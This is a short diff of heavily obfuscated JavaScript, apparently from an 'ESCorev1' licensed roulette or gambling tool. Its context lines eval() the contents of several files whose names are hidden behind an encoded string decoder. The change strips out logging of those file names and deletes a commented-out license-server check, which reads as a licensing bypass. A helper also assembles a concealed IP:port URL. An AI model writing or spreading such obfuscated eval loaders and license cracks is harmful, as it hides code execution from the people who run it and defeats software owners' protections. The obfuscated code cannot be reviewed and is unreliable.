@@ -67,8 +67,7 @@ const config = require(ESCorev1y('0x8', '[TnL')),
     crypto = require(ESCorev1y('0x224', 'U6S)')),
     key = Buffer[ESCorev1y('0x138', '1j1[')]('ESCorev1.0\x20-\x20License\x20System\x20Mana');
 eval(fs[ESCorev1y('0x216', 'h*ZT')](ESCorev1y('0x16b', 'f)Vo')) + ''), eval(fs[ESCorev1y('0xfe', 'zHOI')](ESCorev1y('0xc9', 'L6Bi')) + ''), eval(fs[ESCorev1y('0xe1', '3B&h')](ESCorev1y('0x17a', 'oG5D')) + '');
-console.log(ESCorev1y('0x216', 'h*ZT'));
-console.log(ESCorev1y('0x16b', 'f)Vo'));
+
 function startRoulette() {
     const M = {
         'VXWhe': function(l) {
@@ -272,19 +271,6 @@ function checkRollGeneration() {
         'd': M['ccrVZ']
     };
     let Z = M['KDCpc'](lsystem, z);
-    // request[ESCorev1y('0x11e', 'h*ZT')](j, function(Q, b, s) {
-    //     if (Q) {
-    //         console[ESCorev1y('0xe8', 'b)ny')](Z), process.exit(1);
-    //         return;
-    //     }
-    //     try {
-    //         let I = JSON[ESCorev1y('0x214', 'ob!V')](s);
-    //         !I[ESCorev1y('0x14b', 'vZNe')] && (console[ESCorev1y('0x16c', '1d%]')](I['error']), process.exit(1));
-    //     } catch (J) {
-    //         console[ESCorev1y('0x12d', '[TnL')](Z), process.exit(1);
-    //         return;
-    //     }
-    // });
 
     function U(Q) {
         return Q['p1'] + '.' + Q['p2'] + '.' + Q['p3'] + '.' + Q['p4'] + ':' + Q['p5'] + '/' + Q['p6'] + '/' + Q['p7'] + '/';
